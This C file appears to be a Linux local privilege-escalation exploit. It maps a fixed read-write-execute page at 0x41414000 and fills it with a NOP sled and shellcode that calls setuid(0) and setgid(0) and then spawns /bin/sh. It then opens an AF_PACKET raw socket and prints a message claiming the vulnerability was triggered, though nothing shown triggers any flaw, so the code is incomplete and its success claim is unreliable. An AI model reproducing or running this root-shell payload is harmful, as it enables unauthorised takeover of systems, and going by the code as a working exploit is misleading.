#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>

int main() {
    void *addr = mmap((void*)0x41414000, 0x1000,
        PROT_READ | PROT_WRITE | PROT_EXEC,
        MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if (addr == MAP_FAILED) {
        perror("mmap");
        exit(1);
    }
    memset(addr, 0x90, 0x1000);
    unsigned char shellcode[] = {
        0x48, 0x31, 0xff,
        0x48, 0x31, 0xf6,
        0x48, 0x31, 0xd2,
        0x48, 0x31, 0xc0,
        0xb0, 0x69,
        0x0f, 0x05,
        0x48, 0x31, 0xc0,
        0xb0, 0x6a,
        0x0f, 0x05,
        0x48, 0x31, 0xc0,
        0x50,
        0x48, 0xbb, '/', 'b', 'i', 'n', '/', 's', 'h', 0,
        0x53,
        0x48, 0x89, 0xe7,
        0x50,
        0x57,
        0x48, 0x89, 0xe6,
        0xb0, 0x3b,
        0x0f, 0x05
    };
    memcpy(addr, shellcode, sizeof(shellcode));
    int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (fd < 0) {
        perror("socket");
        return 1;
    }
    printf("[+] triggered vuln, check shell\n");
    return 0;
}
